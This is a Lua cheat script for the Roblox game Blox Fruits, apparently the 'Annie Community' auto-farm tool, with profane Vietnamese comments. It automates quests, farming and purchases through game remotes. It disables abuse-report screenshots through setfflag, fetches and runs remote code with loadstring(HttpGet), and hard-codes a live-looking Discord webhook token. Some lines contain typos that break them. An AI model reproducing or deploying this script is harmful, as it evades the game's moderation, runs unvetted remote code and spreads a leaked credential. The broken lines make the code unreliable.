

-- DO NOT REMOVE ANY KEY BE ABOVE THIS CONFIG IF YOU DON'T TOMORROW YOU WILL RECEIVE IT (gg trans) / KO ĐC XOÁ BẤT KỲ KEY NÀO TRONG CÁI CONFIG NÀY NẾU KO NGÀY MAI KHI CHECK ACC KHÓC K KỊP =)))
-- TYPE CỦA KEY NẾU THAY THÌ PHẢI THAY ĐÚNG()()) TYPE (BOOL = BOOL) THAY BẰNG CÁI KHÁC LÀ BÚ LOL NHÉ EM
-- vd: ["Quest / Race V2"] = true ---sửa--> ["Quest / Race V2"] = "false" -> bú cặc

spawn(function() 
  wait(2400) 
  game.Players.LocalPlayer:Kick("Annie") 
end )
repeat wait() until game: IsLoaded () 


   getgenv().Config = getgenv().Config or {
      ["Main"] =
      {
         ["Fast Method"] = true, -- Đ Làm Player Hunter
         ["Item / Saber"] = true, -- Tự Làm Puzzle Của Saber (Lấy Luôn)
         ["Quest / Bartilo"] = true, -- Tự Làm Nhiệm Vụ Bartilo
         ["Quest / Race V2"] = true, -- Tự Up Tộc v2 (Nhớ Bật Auto Bartilo Trước)
         ["Quest / Race V3"] = true, -- tu up v3  (mink/sky/human) (ko bat auto v2 la ia nha)
         ["Staying On 2ne Sea Until Got Rengoku"] = false,
         ["Misc / Automatically Hop For Rip Indra"] = true,
         ["Auto Farming Cake Prince If Max Level"] = -- Tự Đi Giết Kata Khi Max(Kiếm Fragments)
         {
            ["Enable"] = true, -- Bật or Tắt
            ["Until"] = 30000 -- Treo Cho Đến khi đc số frag m ưng
         },
         ["Auto Farming Bone If Max Level (After Cake Prince)"] =
         {
            ["Enable"] = true, -- Auto Bone Khi Max (Cái Này Sẽ Chạy Sau Auto Katakuri)
         },
         ["Misc / Hop To Another For 1m+ Fruit (Swan Quest)"] = false, -- Tự Hop Kiếm fruit 1m để lm swan quest 
         ["Misc / Automatically Purchase Legendary Sword"] = true, 
         ["Misc / Automatically Purchase Haki Color"] = true, 
         
         ["Misc / Delay For Hopping"] = 15, -- giay, tgian doi trong moi server trc khi hop swanQuest 
         ["Ingoring Eat Another Fruit If Current Fruit Is Awakened"] = true,
         ["Misc / Auto Farming Mastery For Sword (If Have No Task)"] = true, -- tự farm 600mas all item khi xong blacksmith
       
         ["Misc / Hop"] =
         {
           ["Enable"] = true,
           ["Delay"] = 400,
         },
      },
      ["Fruit"] =
      {
         ["Misc / Fruit Sniping"] =
         { -- tự mua khi shop bán df j đó
            "Dough-Dough", "Venom-Venom", "Dragon-Dragom"
         },
         ["Misc / Fruit Looting"] = true, --  Wtf Ko Bật
      
         ["Misc / Fruit Looting"] = true, -- Tự đi cuỗm factory, pirate raid
         ["Misc / Auto Raid If Can't Store"] = true, -- nếu k ăn và k store dc
         ["Misc / Fragments Limit By Fruit Loot Raid"] = 30000, -- khi frag m lớn hơn thì sẽ k raid nx
         ["Eat While Cant Store"] = true -- tự hốc khi đéo ăn dc
      },
      ["Misc"] =
      {
         ["Webhook"] =
         { -- Discord Webhook
            ["Url"] = "https://discord.com/api/webhooks/1173059368447655996/V118UZx4nJ0bCfgKHzFfxtsPav8JT9IA18iPT9iv49CNvinGtqJqhvNOjm7jifHRsGbY", -- Webhook Của Mày
            ["Enable"] = true, -- Bật or Tẵt
         
            ["Webhook Setting"] =
            { --Gửi Những J Vào Webhook
               ["Account Status"] = true , --Thông Tin Acc
               ["Delay"] = 300,
              -- Chờ Bao Nhiêu R Gửi? (giây)
               
            }
         },
         ["White Screen"] = false,

         ["Fast Attack Delay"] = 0.1,
         ["Remove Terrain"] = false 
      }
   }
   
-------- anti hooker

gay = tick()

game: GetService"RunService".Heartbeat: Connect(function() 
  sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge) 
  pcall(function() 
    for i, v in pairs(game.workspace.Enemies:GetChildren()) do 
      if v.Humanoid.Health < 1 and not aD then 
        v:Destroy() 
      end 
    end 
  end)

  pcall(function() 
    if setfflag then
        setfflag("AbuseReportScreenshot", "False")
        setfflag("AbuseReportScreenshotPercentage", "0")
    end 
    end)
end ) 

script_time = os.time()
if not isfolder(".Annie/BloxFruit/Kaitun/") then
               makefolder(".Annie/BloxFruit/Kaitun/")
end
             inv = game:GetService("ReplicatedStorage").Remotes["CommF_"]:InvokeServer("getInventory")
   function randomChar()

      local charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#₫_&-+()/*':;;!?£~`€|$•¢√^π°÷=×{§}∆%©®™✓[]'"

      local length = 15
      local index = math.random(1, length)
      local char = charset:sub(index, index)
      return char
   end

   function getServerTime()
      RealTime = tostring(math.floor(game.Lighting.ClockTime * 100) / 100)
      RealTime = tostring(game.Lighting.ClockTime)
      RealTimeTable = RealTime:split(".")
      Minute, Second = RealTimeTable[1], tonumber(0 + tonumber(RealTimeTable[2] / 100)) * 60
      return math.floor(Minute).."min"
   end
   local badtimedicac = os.time()
         if not isfile(".Annie/BloxFruit/Kaitun/eslapedtime."..game.Players.LocalPlayer.Name) then
        
         writefile(".Annie/BloxFruit/Kaitun/eslapedtime."..game.Players.LocalPlayer.Name, "0")
         esltime = 0 
         end 
   ctent2 = readfile(".Annie/BloxFruit/Kaitun/eslapedtime."..game.Players.LocalPlayer.Name)
   function updatetime()
      if not isfile(".Annie/BloxFruit/Kaitun/eslapedtime."..game.Players.LocalPlayer.Name) then
       
         writefile(".Annie/BloxFruit/Kaitun/eslapedtime."..game.Players.LocalPlayer.Name, "0")
         esltime = 0
      else
         ctent = readfile(".Annie/BloxFruit/Kaitun/eslapedtime."..game.Players.LocalPlayer.Name)
         if tonumber(ctent) or ctent == "0" or ctent == "1" then
            esltime = tonumber(ctent2 or 0) + (os.time()-(badtimedicac or os.time()))
            writefile(".Annie/BloxFruit/Kaitun/eslapedtime."..game.Players.LocalPlayer.Name, tostring(esltime))
            pcall(function() clockm:SetText(disp_time(esltime))end)
            pcall(function() TextLabel_7.Text = getServerTime() end)

         else
            noti("Something Wrong With Config, Automatically Generate A New One")
            esltime = "0"
            writefile(".Annie/BloxFruit/Kaitun/eslapedtime."..game.Players.LocalPlayer.Name, "0")
         end
         end end

         function AYU_FINGERPRINT()
            if not isfile(".ayu_fingerprint") then
               fingerprint = randomChar()
               savefile(".ayu_fingerprint", fingerprint)
               return fingerprint
            else
               return readfile(".ayu_fingerpriny")
            end
         end

local placeId = game.PlaceId
if placeId == 2753915549 then
    Sea = "Main"
elseif placeId == 4442272183 then
    Sea = "Dressrosa"
elseif placeId == 7449423635 then
    Sea = "Zou"
end


         function c()
            return getgenv().Config
         end

         tickcac = tick()
         local plrs = game.Players

         local lp = plrs.LocalPlayer

         local char = lp.Character

         if not isfile"conmemaydi.txt" then
           writefile("conmemaydi.txt", "") 
         end

         local Q = require(game.ReplicatedStorage.Quests)

         local R = {"BartiloQuest", "Trainees", "MarineQuest", "CitizenQuest"}


         local AkaliNotif =
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua"))()

         local Notify = AkaliNotif.Notify

         timelol = os.time()
         BoneMobs = {
            "Reborn Skeleton",
            "Living Zombie",
            "Demonic Soul",
            "Posessed Mummy"
         }

         EctoMob = {"Ship Deckhand", "Ship Engineer", "Ship Steward"}

         DoughBoss = {
            "Dough King",
            "Cake Prince"
         }

         MobsCakePrince = {
            "Cookie Crafter",
            "Cake Guard",
            "Baking Staff",
            "Head Baker"
         }

         backi = {
           "Human", 
         }
         fruittier = {
            ["Bomb Fruit"] = 1,
            ["Spike Fruit"] = 0,
            ["Chop Fruit"] = 4,
            ["Spring Fruit"] = 3,
            ["Kilo Fruit"] = 2,
            ["Spin Fruit"] = 5,
            ["Falcon Fruit"] = 6,
            ["Smoke Fruit"] = 7,
            ["Flame Fruit"] = 9,
            ["Ice Fruit"] = 12,
            ["Sand Fruit"] = 10,
            ["Dark Fruit"] = 11,
            ["Revive Fruit"] = 8,
            ["Diamond Fruit"] = 8,
            ["Light Fruit"] = 12,
            ["Love Fruit"] = 11,
            ["Rubber Fruit"] = 8,
            ["Barrier Fruit"] = 6,
            ["Magma Fruit"] = 14,
            ["Quake Fruit"] = 13,
            ["Portal Fruit"] = 13,
            ["Human: Buddha Fruit"] = 15,
            ["Spider Fruit"] = 12,
            ["Phonex Fruit"] = 10,
            ["Rumble Fruit"] = 15,
            ["Paw Fruit"] = 7,
            ["Gravity Fruit"] = 1,
            ["Shadow Fruit"] = 14,
            ["Dough Fruit"] = 20,
            ["Venom Fruit"] = 19,
            ["Control Fruit"] = 11,
            ["Spirit Fruit"] = 18,
            ["Dragon Fruit"] = 19,
            ["Leopard Fruit"] = 25
         }

         CocoaMobs = {"Cocoa Warrior", "Chocolate Bar Battler"}

         elite = {"Deandre", "Urban", "Diablo"}

         meleetable = {"DragonTalon", "Superhuman", "Godhuman", "ElectricClaw", "SharkmanKarate", "DeathStep", "BlackLeg", "FishmanKarate", "Electro", "DragonClaw"}
         meleetable2 = {
            "Dragon Talon", "Superhuman", "Godhuman", "Electric Claw", "Sharkman Karate", "Death Step", "Black Leg", "Fishman Karate", "Electro", "Dragon Claw"
         }
         meleetable3 = {}
         for i, v in pairs(meleetable2) do
            meleetable3[v] = meleetable[i]
         end
meleetable4 = {}
         for i, v in pairs(meleetable) do
            meleetable4[v] = meleetable2[i]
         end

         browhat = {

            ["Black Leg"] = "BuyBlackLeg",
            ["Fishman Karate"] = "BuyFishmanKarate",
            ["Electro"] = "BuyElectro",
            ["Dragon Claw"] = function()
            dragonclawtrue = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "1") == 1
            game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "2")
            return dragonclawtrue
            end,
            ["Superhuman"] = "BuySuperhuman",
            ["Sharkman Karate"] = "BuySharkmanKarate",
            ["Death Step"] = "BuyDeathStep",
            ["Dragon Talon"] = "BuyDragonTalon",
            ["Godhuman"] = "BuyGodhuman",
            ["Electric Claw"] = "BuyElectricClaw"
         }

         local fruit = {"Bomb-Bomb","Spike-Spike","Chop-Chop","Spring-Spring","Kilo-Kilo","Spin-Spin","Falcon-Falcon","Smoke-Smoke","Flame-Flame","Ice-Ice","Sand-Sand","Dark-Dark","Revive-Revive","Diamond-Diamond","Light-Light","Love-Love","Rubber-Rubber","Barrier-Barrier","Magma-Magma","Portal-Portal","Quake-Quake","Human-Human: Buddha","Spider-Spider","Bird-Bird: Phoenix","Rumble-Rumble","Paw-Paw","Gravity-Gravity","Dough-Dough","Shadow-Shadow","Venom-Venom","Control-Control","Spirit-Spirit","Dragon-Dragon", "Leopard-Leopard"}
         a3 = require(game.ReplicatedStorage:WaitForChild("GuideModule"))

         function disp_time(time)
            time = tonumber(time)
            if not time then return "[err]" end
            local days = math.floor(time/86400)
            local hours = math.floor(math.fmod(time, 86400)/3600)
            local minutes = math.floor(math.fmod(time,3600)/60)
            local seconds = math.floor(math.fmod(time,60))
            return (days.."day, "..hours.."hrs, "..minutes.."min, "..seconds.."s")
         end
         if c().Misc["White Screen"] then
            game:GetService"RunService": Set3dRenderingEnabled(0)
         end
         UserInputService = game:GetService"UserInputService"
         local function MakeDraggable(topbarobject, object)
            local Dragging = nil
            local DragInput = nil
            local DragStart = nil
            local StartPosition = nil

            local function Update(input)
               local Delta = input.Position - DragStart
               local pos = UDim2.new(StartPosition.X.Scale, StartPosition.X.Offset + Delta.X, StartPosition.Y.Scale, StartPosition.Y.Offset + Delta.Y)
               local Tween = game:GetService"TweenService":Create(object, TweenInfo.new(0.15), {Position = pos})
               Tween:Play()
            end

            topbarobject.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
               Dragging = true
               DragStart = input.Position
               StartPosition = object.Position

               input.Changed:Connect(function()
               if input.UserInputState == Enum.UserInputState.End then
                  Dragging = false
               end
               end)
            end
            end)

            topbarobject.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
               DragInput = input
            end
            end)

            UserInputService.InputChanged:Connect(function(input)
            if input == DragInput and Dragging then
               Update(input)
            end
            end)
         end
function vcl(a, b) 
  if a: FindFirstChild"Level" then 
    return a.Level.Value 
   else 
     return b or 0 
  end 
end 
 
         function checkitem(sw)
            local a = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(sw)
            local b =  game.Players.LocalPlayer.Character:FindFirstChild(sw)
            if ( a and a.Name == sw)  then 
              
              return {Mastery = vcl(a , 0)} 
            end 
            
            if ( b and b.Name == sw)  then
              return {Mastery = vcl(b , 0)} 
            end 
            
            for k, v in pairs(inv) do
               if v.Name == sw then
                  return v
               end
            end
            return false
         end

 
         function checkitem2(sw)
            local a = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(sw)
            local b =  game.Players.LocalPlayer.Character:FindFirstChild(sw)
            if ( a and a.Name == sw)  then 
              
              return {Mastery = vcl(a , 0)} 
            end 
            
            if ( b and b.Name == sw)  then 
              return {Mastery = vcl(b , 0)} 
            end 
            
            return false
         end


         function NameMelee(a)
            a = a or false
            for r, v in next, game:GetService("Players").LocalPlayer.Backpack:GetChildren() do
               if v:IsA("Tool") and v.ToolTip == "Melee" then
                  if a then
                     return v
                  else
                     return v.Name
                  end
               end
            end
            for r, v in next, game:GetService("Players").LocalPlayer.Character:GetChildren() do
               if v:IsA("Tool") and v.ToolTip == "Melee" then
                  if a then
                     return v
                  else
                     return v.Name
                  end
               end
            end
         end
         function NameDf(a)
            a = a or false
            for r, v in next, game:GetService("Players").LocalPlayer.Backpack:GetChildren() do
               if v:IsA("Tool") and v.ToolTip == "Blox Fruit" then
                  if a then
                     return v
                  else
                     return v.Name
                  end
               end
            end
            for r, v in next, game:GetService("Players").LocalPlayer.Character:GetChildren() do
               if v:IsA("Tool") and v.ToolTip == "Blox Fruit" then
                  if a then
                     return v
                  else
                     return v.Name
                  end
               end
            end 
            return "Bomb-Bomb"
         end
         function checkm2(melee)
           if melee == "DragonClaw" then
             return game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", melee, "1")
           end 
           return game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Buy" .. melee, true) 
         end 
         
         function checkMelee(melee)


            if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Buy" .. melee, true) == 1 or game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", melee, "1") == 1 then
               return true
            end
if NameMelee() == meleetable4[melee] then return true end
            return false;
         end
         local function Turtle(image)

            rotationAngle = ( rotationAngle or 0) + 180
            game:GetService("TweenService"):Create(image, TweenInfo.new(1), {Rotation = rotationAngle}):Play()
         end
         local function fadeBlur()
            local lighting = game:GetService("Lighting")
            local blur = lighting:FindFirstChild("Blur") or Instance.new("BlurEffect")
            blur.Name = "Blur"

            local blurIntensity = 0
            local targetIntensity = 10
            game:GetService("TweenService"):Create(blur, TweenInfo.new(1), {Size = 10}):Play()
            for intensity = blur.Size, 0, -0.1 do
               blur.Size = intensity
               wait(0.05)
            end
         end

         local function resetBlur()
            local lighting = game:GetService("Lighting")
            local blur = lighting:FindFirstChild("Blur")

            if blur then
               game:GetService("TweenService"):Create(blur, TweenInfo.new(1), {Size = -0.1}):Play()
               blur:Destroy()
            end
         end
         if c().Misc.Ui then
 

local repo = 'https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/'

local Library = loadstring(game:HttpGet(repo .. 'Library.lua'))()
local ThemeManager = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))()
local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()


local Window = Library:CreateWindow({

    Title = 'Annie Community Free Scripts '..os.date("%d".." ".."%B".." ".."%Y"),

    Center = true, 
    AutoShow = true, 
    TabPadding = 8,
    MenuFadeTime = 0.2
})
local Tabs = {
    Main = Window:AddTab('Con Me May Bel'), 
} 
--ThemeManager:ApplyTheme(game:GetService"HttpService":JSONDecode('{"FontColor":"ffffff","MainColor":"191925","AccentColor":"6759b3","BackgroundColor":"16161f","OutlineColor":"323232"}'))
local LeftGroupBox2 = Tabs.Main:AddRightTabbox("Main")
local CheckMelee = LeftGroupBox2:AddTab('Melee')

local LeftGroupBox3 = Tabs.Main:AddRightTabbox("Main")
local CheckSwords = LeftGroupBox3:AddTab('Swords')

local LeftGroupBox9 = Tabs.Main:AddRightTabbox("Main")
local CheckLegendSwords = LeftGroupBox9:AddTab('Legendary Swords')

local Main1 = Tabs.Main:AddLeftTabbox("Main")
local Info = Main1:AddTab('Info')
local Kaitan = Main1:AddTab('Kaitan')

-- local LeftGroupBox6 = Tabs.Main:AddLeftTabbox("Ma")
-- local Main = LeftGroupBox6:AddTab('GaySex')
-- 
local LeftGroupBox7 = Tabs.Main:AddLeftTabbox("GaysEx")
lmlmlmlmkmlmlkk = LeftGroupBox7:AddTab"Status" 

clockm = lmlmlmlmkmlmlkk:AddLabel"Still Updating..."
waid1 = lmlmlmlmkmlmlkk:AddLabel"What Im I Doing?"
waid2 = lmlmlmlmkmlmlkk:AddLabel"What Im I Doing 2 ?"
mgstat = lmlmlmlmkmlmlkk:AddLabel"Mirage Status: Updating"
fmstat = lmlmlmlmkmlmlkk:AddLabel"Full Moon Status: Updating"
elitestt = lmlmlmlmkmlmlkk:AddLabel"Elite Spawn: Updating"

dismcount= lmlmlmlmkmlmlkk:AddLabel"Dismention Count: Updating"

local LeftGroupBox8 = Tabs.Main:AddLeftTabbox("Main")
local CheckQuest = LeftGroupBox8:AddTab('Unlock Quest')

local LeftGroupBox4 = Tabs.Main:AddLeftTabbox("Main")
local CheckGun = LeftGroupBox4:AddTab('Guns')

Info:AddLabel("Annie Community Kaitun Script") 
    Time = Info:AddLabel("ServerTime")
    function UpdateTime()
        local GameTime = math.floor(workspace.DistributedGameTime+0.5)
        local Hour = math.floor(GameTime/(60^2))%24
        local Minute = math.floor(GameTime/(60^1))%60
        local Second = math.floor(GameTime/(60^0))%60
        Time:SetText("Hour "..Hour.." Minute "..Minute.." Second "..Second)
    end
    function MoonTextureId()
    if Sea1 then
        return game:GetService("Lighting").FantasySky.MoonTextureId
    elseif Sea2 then
        return game:GetService("Lighting").FantasySky.MoonTextureId
    elseif Sea3 then
        return game:GetService("Lighting").Sky.MoonTextureId
    end
end

Kaitan:AddToggle('KaitanF', {
    Text = 'Start Kaitan',
    Default = true,
})

Toggles.KaitanF:OnChanged(function(value)
    getgenv().ForceStop = not value
end)
Shisui = CheckLegendSwords:AddLabel("[-] : Shisui Sword")
Saddi = CheckLegendSwords:AddLabel("[-] : Saddi Sword")
Wando = CheckLegendSwords:AddLabel("[-] : Wando Sword")


Kaitan:AddButton("Show Item", function()
    local cac = require(game:GetService("Players").LocalPlayer.PlayerGui.Main.UIController.Inventory)
		local Inventory = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getInventory")
		local Items = {}
		local RaityLevel = {"Mythical","Legendary","Rare","Uncommon","Common"}
		local RaityColor =  {
			["Common"] = Color3.fromRGB(179, 179, 179),
			["Uncommon"] = Color3.fromRGB(92, 140, 211),
			["Rare"] =  Color3.fromRGB(140, 82, 255),
			["Legendary"] = Color3.fromRGB(213, 43, 228) ,
			["Mythical"] =  Color3.fromRGB(238, 47, 50)
		}
		function GetRaity(color)
			for k,v in pairs(RaityColor) do 
				if v==color then return k end
			end
		end

		for k,v in pairs(Inventory) do 
			Items[v.Name] = v
		end

		local total = #getupvalue(cac.UpdateRender,4)
		local rac = {}
		local allitem = {}
		local total2 = 0
		while total2<total do 
			local i = 0
			while i < 25000 and total2<total do 
				game:GetService("Players").LocalPlayer.PlayerGui.Main.InventoryContainer.Right.Content.ScrollingFrame.CanvasPosition = Vector2.new(0,i)
				for k,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Main.InventoryContainer.Right.Content.ScrollingFrame.Frame:GetChildren()) do 
					if v:IsA("Frame") and not rac[v.ItemName.Text] and v.ItemName.Visible==true then 
						local vaihuhu = GetRaity(v.Background.BackgroundColor3)
						if vaihuhu then
					
							if not allitem[vaihuhu] then 
								allitem[vaihuhu] = {}
							end
							table.insert(allitem[vaihuhu],v:Clone())
						end
						total2=total2+1
						rac[v.ItemName.Text] = true
					end
				end
				i=i+20
			end
			wait()
		end
		function GetXY(vec) 
			return vec*100
		end

		local tvk = Instance.new("UIListLayout")
		tvk.FillDirection = Enum.FillDirection.Vertical
		tvk.SortOrder = 2
		tvk.Padding = UDim.new(0,10)

		local Left = Instance.new("Frame",game.Players.LocalPlayer.PlayerGui.BubbleChat)
		Left.BackgroundTransparency = 1
		Left.Size = UDim2.new(.5,0,1,0) 
		tvk.Parent = Left

		local Right = Instance.new("Frame",game.Players.LocalPlayer.PlayerGui.BubbleChat)
		Right.BackgroundTransparency = 1
		Right.Size = UDim2.new(.5,0,1,0) 
		Right.Position = UDim2.new(.6,0,0,0)
		tvk:Clone().Parent = Right
		for k,v in pairs(allitem) do 
			local cac = Instance.new("Frame",Left)
			cac.BackgroundTransparency = 1
			cac.Size = UDim2.new(1,0,0,0) 
			cac.LayoutOrder = table.find(RaityLevel,k)

			local cac2 = Instance.new("Frame",Right)
			cac2.BackgroundTransparency = 1
			cac2.Size = UDim2.new(1,0,0,0) 
			cac2.LayoutOrder = table.find(RaityLevel,k)

			local tvk = Instance.new("UIGridLayout",cac)
			tvk.CellPadding = UDim2.new(.005,0,.005,0)
			tvk.CellSize =  UDim2.new(0,70,0,70)
			tvk.FillDirectionMaxCells = 100
			tvk.FillDirection = Enum.FillDirection.Horizontal

			local ccc = tvk:Clone()
			ccc.Parent = cac2
			for k,v in pairs(v) do 
				if Items[v.ItemName.Text] and Items[v.ItemName.Text].Mastery then 
					if v.ItemLine2.Text~="Accessory" then 
						local bucac = v.ItemName:Clone()
						bucac.BackgroundTransparency = 1
						bucac.TextSize = 10
						bucac.TextXAlignment  = 2
						bucac.TextYAlignment  = 2
						bucac.ZIndex  = 5
						bucac.Text = Items[v.ItemName.Text].Mastery
						bucac.Size = UDim2.new(.5,0,.5,0)
						bucac.Position = UDim2.new(.5,0,.5,0)
						bucac.Parent = v
					end
					v.Parent = cac
				elseif v.ItemLine2.Text == "Blox Fruit" then 
					v.Parent = cac2
				end
			end
			cac.AutomaticSize = 2
			cac2.AutomaticSize = 2
		end
		local ListHuhu = {
			["Superhuman"] = Vector2.new(3,2),
			["DeathStep"] = Vector2.new(4,3),
			["ElectricClaw"] = Vector2.new(2,0),
			["SharkmanKarate"] = Vector2.new(0,0),
			["DragonTalon"] = Vector2.new(1,5)
		}
		local MeleeG = Instance.new("Frame",Left)
		MeleeG.BackgroundTransparency = 1
		MeleeG.Size = UDim2.new(1,0,0,0) 
		MeleeG.LayoutOrder = table.find(RaityLevel,k)
		MeleeG.AutomaticSize=2
		MeleeG.LayoutOrder = 100
		local tvk = Instance.new("UIGridLayout",MeleeG)
		tvk.CellPadding = UDim2.new(.005,0,.005,0)
		tvk.CellSize =  UDim2.new(0,70,0,70)
		tvk.FillDirectionMaxCells = 100
		tvk.FillDirection = Enum.FillDirection.Horizontal

		local cac = {"Superhuman","ElectricClaw","DragonTalon","SharkmanKarate","DeathStep","GodHuman"}
		for k,v in pairs(cac) do
			if ListHuhu[v] and game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Buy"..v,true) == 1 then 
				local huhu = Instance.new("ImageLabel",MeleeG)
				huhu.Image = "rbxassetid://9945562382"
				huhu.ImageRectSize = Vector2.new(100,100)
				huhu.ImageRectOffset = ListHuhu[v]*100
			end
		end
		function formatNumber(v)
			returstring(v):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
		end
		game:GetService("Players").LocalPlayer.PlayerGui.Main.Beli.Position = UDim2.new(0,800,0,500)
		game:GetService("Players").LocalPlayer.PlayerGui.Main.Level.Position = UDim2.new(0,800,0,550)

		local thieunang = game:GetService("Players").LocalPlayer.PlayerGui.Main.Fragments:Clone()
		thieunang.Parent = game:GetService("Players").LocalPlayer.PlayerGui.BubbleChat
		thieunang.Position = UDim2.new(0,800,0.63,0)
		local n = formatNumber(game.Players.LocalPlayer.Data.Fragments.Value)
		thieunang.Text = "ƒ"..n
		pcall(function() 
			game:GetService("Players").LocalPlayer.PlayerGui.Main.MenuButton:Destroy()
		end)
		pcall(function() 
			game:GetService("Players").LocalPlayer.PlayerGui.Main.HP:Destroy()
		end)
		pcall(function() 
			game:GetService("Players").LocalPlayer.PlayerGui.Main.Energy:Destroy()
		end)
		for k,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Main:GetChildren()) do 
			if v:IsA("ImageButton") then 
				v:Destroy()
			end
		end
		pcall(function() 
			game:GetService("Players").LocalPlayer.PlayerGui.Main.Compass:Destroy()
		end)
end)
Kaitan:AddButton('Rejoin Server', function()
    game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").localPlayer)
end)

Kaitan:AddToggle('Condi', {
    Text = 'White Screen',
    Default = true,
})

Toggles.Condi:OnChanged(function(value)
  
    if value then 
        game:GetService"RunService":Set3dRenderingEnabled(true) 
    return; 
    end 
    game:GetService"RunService":Set3dRenderingEnabled(false)
end) 

Kaitan:AddToggle('Condi2', {
    Text = 'Chest Farm',
    Default = false,
})

Toggles.Condi2:OnChanged(function(value)
  getgenv().Config.ChestFarm = value
end) 



PlayerName = Info:AddLabel("Player Name: "..game.Players.LocalPlayer.Name) 
vclui = {}
vclui.Superhuman = CheckMelee:AddLabel("[-] : Superhuman")

vclui["Death Step"] = CheckMelee:AddLabel("[-] : Death Step")
vclui["Sharkman Karate"] = CheckMelee:AddLabel("[-] : Sharkman Karate")
vclui["Electric Claw"] = CheckMelee:AddLabel("[-] : Electric Claw")
vclui["Dragon Talon"] = CheckMelee:AddLabel("[-] : Dragon Talon")
vclui.Godhuman = CheckMelee:AddLabel("[-] : God Human")



TrueTripleKatana = CheckSwords:AddLabel("[-] : True Triple Katana")

Saber = CheckSwords:AddLabel("[-] : Saber")
Rengoku = CheckSwords:AddLabel("[-] : Rengoku")
MidnightBlade = CheckSwords:AddLabel("[-] : Midnight Blade")
DragonTrident = CheckSwords:AddLabel("[-] : DragonTrident")
Yama = CheckSwords:AddLabel("[-] : Yama")
BuddySword = CheckSwords:AddLabel("[-] : Buddy Sword")
Canvander = CheckSwords:AddLabel("[-] : Canvander")
SpikeyTrident = CheckSwords:AddLabel("[-] : Spikey Trident")
HallowScythe = CheckSwords:AddLabel("[-] : Hallow Scythe")
DarkDagger = CheckSwords:AddLabel("[-] : Dark Dagger")
Tushita = CheckSwords:AddLabel("[-] : Tushita")



Kabucha = CheckGun:AddLabel("[-] : Kabucha Gun")

AcidumRifle = CheckGun:AddLabel("[-] : Acidum Rifle")
BizarreRifle = CheckGun:AddLabel("[-] : Bizarre Rifle")
BartiloQuest = CheckQuest:AddLabel("[-] : Bartilo Quest")
DonSwanQuest = CheckQuest:AddLabel("[-] : Don Swan Quest")
KillDonSwan = CheckQuest:AddLabel("[-] : Kill Don Swan") 

spawn(

    function()

        while wait(1) do 
          pcall(function ()
            if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BartiloQuestProgress", "Bartilo") == 3 then
                BartiloQuest:SetText("[+] : Bartilo Quest")
            end
            if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GetUnlockables")["FlamingoAccess"] then
            
                DonSwanQuest:SetText("[+] : Don Swan Quest")
            end
            if zqp == 1 then
                KillDonSwan:SetText("[+] : Kill Don Swan")
            end
        end)
    
       --print     spawn(
          --      function()
                    for i, v in pairs(
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getInventory")
                    ) do
                        if v.Name == "Saber" then
                            Saber:SetText("[+] : Saber")
                        end
                        if v.Name == "Rengoku" then
                            Rengoku:SetText("[+] : Rengoku")
                        end
                        if v.Name == "Midnight Blade" then
                            MidnightBlade:SetText("[+] : Midnight Blade")
                        end
                        if v.Name == "Dragon Trident" then
                            DragonTrident:SetText("[+] : Dragon Trident")
                        end
                        if v.Name == "Yama" then
                            Yama:SetText("[+] : Yama")
                        end
                        if v.Name == "Buddy Sword" then
                            BuddySword:SetText("[+] : Buddy Sword")
                        end
                        if v.Name == "Canvander" then
                            Canvander:SetText("[+] : Canvander")
                        end
                        if v.Name == "Spikey Trident" then
                            SpikeyTrident:SetText("[+] : Spikey Trident")
                        end
                        if v.Name == "Hallow Scythe" then
                            HallowScythe:SetText("[+] : Hallow Scythe")
                        end
                        if v.Name == "Dark Dagger" then
                            DarkDagger:SetText("[+] : Dark Dagger")
                        end
                        if v.Name == "Acidum Rifle" then
                            AcidumRifle:SetText("[+] : Acidum Rifle")
                        end
                        if v.Name == "Kabucha" then
                            Kabucha:SetText("[+] : Kabucha")
                        end
                        if v.Name == "Bizarre Rifle" then
                            BizarreRifle:SetText("[+] : Bizarre Rifle")
                        end
                        if v.Name == "Shisui" then
                            Shisui:SetText("[+] : Shisui")
                        end
                        if v.Name == "Saddi" then
                            Saddi:SetText("[+] : Saddi")
                        end
                        if v.Name == "Wando" then
                            Wando:SetText("[+] : Wando")
                        end
                        if v.Name == "True Triple Katana" then
                            TrueTripleKatana:SetText("[+] : True Triple Katana")
                        end
                    end
                end
            
      --   end
--     
-- )
-- 
end)
end
         fruitMap = {}
fruitprice = {}
         for i, name in ipairs(fruit) do
            local parts = {}
            for part in string.gmatch(name, "[^-]+") do
               table.insert(parts, part)
            end
            local key = table.concat(parts, "-")
            local value = parts[1] .. " Fruit"
            fruitMap[key] = value
           --print(key, value )
         end
fruitMap[#fruitMap+1]="Human-Human: Buddha"
